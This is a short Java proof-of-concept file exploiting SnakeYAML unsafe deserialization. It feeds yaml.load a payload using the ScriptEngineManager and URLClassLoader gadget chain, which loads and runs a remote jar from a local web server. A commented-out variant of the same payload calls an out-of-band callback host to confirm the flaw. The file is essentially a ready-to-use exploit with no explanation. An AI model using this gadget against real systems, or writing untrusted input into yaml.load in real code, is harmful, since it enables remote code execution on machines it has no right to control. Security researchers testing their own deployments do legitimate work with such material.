package org.dili.snakeyaml;

import org.yaml.snakeyaml.Yaml;

public class PocScriptEngineManager {
    public static void main(String[] args) {
        //String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://tlk0u6qn.eyes.sh\"]]]]\n";
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8080/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}

